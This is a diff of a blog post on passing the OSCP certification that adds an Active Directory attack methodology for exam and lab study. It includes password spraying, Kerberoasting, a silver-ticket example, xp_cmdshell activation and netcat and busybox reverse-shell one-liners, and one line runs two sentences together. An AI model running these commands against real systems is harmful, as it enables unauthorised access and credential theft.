@@ -1,17 +1,8 @@
 ---
 title: How I Passed the OSCP
 date: 2024-09-18T18:38:38.550Z
-lastmod: 2024-09-19T06:40:17.022Z
-toc: true
-image: "https://amirr0r.github.io/assets/img/oscp/offsec-black.png"
-featured: true
-tags:
-    - OSCP
-    - Offsec
-    - Penetration Testing
-
+lastmod: 2024-09-19T08:53:08.602Z
 ---
-
 I passed the OSCP just six months into my cybersecurity journey, despite having limited prior experience.\
 Before this, I had mainly worked with MERN Stack Web Development and experimented with Arch Linux and was fully immersed in all things Linux.
 
@@ -60,7 +51,7 @@ I would recommend to do this list of [recommendations](https://wiki.vulnlab.com/
 
 Ok I'll admit, shelling out \$2,599 for the Learn One subscription was a bit terrifying and the stakes were never higher. I opted the one year subscription and started it from May 24th.
 
-I will not be going into much detail about the course but I will share how much I am allowed to
+I will not be going into much detail about the course but I will share how much I am allowed toWhenever you are hacking a machine don't be afraid to lookup hints, it's always better to learn what you don't know than stumbling around in the dark but only look it up when you have already tried everything you know.
 
 ## Course Material
 
@@ -73,6 +64,8 @@ I did all the challenge labs except Skylark which I had completed 50% of. Medtec
 OSCP A,B and C were exam-like and had 3 machines for AD network and 3 standalones. I found them much easier than the actual exam.
 
 # Tips & Tricks
+
+Whenever you are hacking a machine don't be afraid to lookup hints, it's always better to learn what you don't know than stumbling around in the dark but only look it up when you have already tried everything you know.
 
 The main tip I would like to give is anything you find even slightly suspicious search about it on [HackTricks](https://book.hacktricks.xyz/). It is a great resource and helped me immensely to pass the exam.
 
@@ -145,16 +138,130 @@ For linux always check `/opt` and check if you belong in any [interesting groups
 
 ## Active Directory
 
-I will give the general outline:
+Use this [mindmap](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg) for AD
 
-* Get users:
+Always check the password policy if available first:
+
+```bash
+nxc smb <ip> --pass-pol
+```
+
+When it comes to AD methodology is very important as missing one minor detail can prevent you from pwning the DC. That said here is a general outline of the methodology I follow
+
+### SMB
+
+* Check SMB shares for anonymous access
+  ```bash
+  smbclient -L \\\\ip\\
+  ```
+* Check if the smb files are accessible from any webserver running
+* Can you can get usernames from the shares
+* Can you put a file on the share which will be clicked by a user, if so can  you can catch the hash using responder(use in analyse mode)
+  ```bash
+  sudo responder -A -I tun0
+  ```
+
+### FTP
+
+* Check for interesting files.
+* Check if the ftp files are accessible from any webserver running
+
+### Get users
+
+* Ldap
   ```bash
   nxc ldap <ip> -u '' -p '' --query "(objectClass=*)" "*"
   ```
+  Repeat if any credentials are discovered.
 
-## Reverse Shells
+* Netexec
 
-For reverse shells use [revshell.com](https://www.revshells.com/) for both windows and Linux
+  ```bash
+  nxc smb <ip> -u UserNAme -p 'PASSWORDHERE' --rid-brute
+  ```
+
+  ```
+  nxc smb <ip> --users
+  ```
+
+  Can be useful for enumerating users without credentials
+
+* Kerbrute
+  ```bash
+  kerbrute userenum --dc dc.domain.com -d domain.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+  ```
+  This will bruteforce users.
+
+* RPC
+  ```bash
+  rpcclient -U '' -N <ip>
+  enumdomusers
+  querydispinfo
+  ```
+  Only users:
+  ```bash
+  rpcclient -U "" <ip> -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > userlist.txt
+  ```
+
+### Got usernames
+
+* Bruteforce usernames as password
+  ```bash
+  nxc smb <ip> -u usernames.txt -p usernames.txt
+  ```
+  Try with winrm and rdp too and try once again with `--local-auth`\
+  I can not stress enough about this, I lost count how many times I got creds from this
+* Asreproasting
+  ```bash
+  nxc ldap <ip> -u user.txt -p '' --asreproast
+  ```
+  Crack hash with hashcat
+
+### Got creds
+
+* Kerberoasting
+  ```bash
+  GetUserSPNs.py -dc-ip <ip> domain.com/user -request
+  ```
+  Crack hash with hashcat.
+
+* Bloodhound.py
+  ```bash
+  nxc ldap <ip> -u user -p pass --bloodhound -c All -ns <ip>
+  ```
+  Check outbound transitive object control
+
+* If it is a service account try **silver ticket attack**. I will add an example with MS SQL
+  ```bash
+  ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
+  ```
+  Ex:
+  ```
+  ticketer.py -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -spn TotesLegit/dc.sequel.htb administrator
+  ```
+  Now use ticket to login to the SQL service:
+  ```
+  KRB5CCNAME=administrator.ccache mssqlclient.py -k Administrator@dc.sequel.htb
+  ```
+  Enable xp\_cmdshell:
+  ```SQL
+  EXEC sp_configure 'show advanced options',1;
+  RECONFIGURE;
+  EXEC sp_configure 'xp_cmdshell',1; 
+  RECONFIGURE;-- 
+  ```
+  Get a shell:
+  ```sql
+  EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe <ip> <port>";--
+  ```
+  Also check for Impersonation
+  ```
+  SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+  ```
+
+### Reverse Shells
+
+For reverse shells use [revshells.com](https://www.revshells.com/) for both windows and Linux
 
 For Linux reverse shells try using busybox first as I found that to be the most reliable:
 
@@ -162,5 +269,15 @@ For Linux reverse shells try using busybox first as I found that to be the most 
 busybox nc <ip> <port> -e sh
 ```
 
+For Windows try the Powershell Base64 encoded from revshells.com
+
 And note that you can use the same reverse shell (for example reverse.exe you generated using msfvenom) multiple times.\
 Once a reverse shell is connected you can start a listener again and connect to the same port once again.
+
+# Conclusion
+
+I think I've covered most of the tricks I learnt throughout my journey but do checkout my Gitbook for my cheatsheet which will have more information.
+
+Good luck to anyone preparing for the OSCP and remember "Try Harder"
+
+![How I Passed the OSCP\_1.gif](/postimgs/Images/How%20I%20Passed%20the%20OSCP_1.gif)
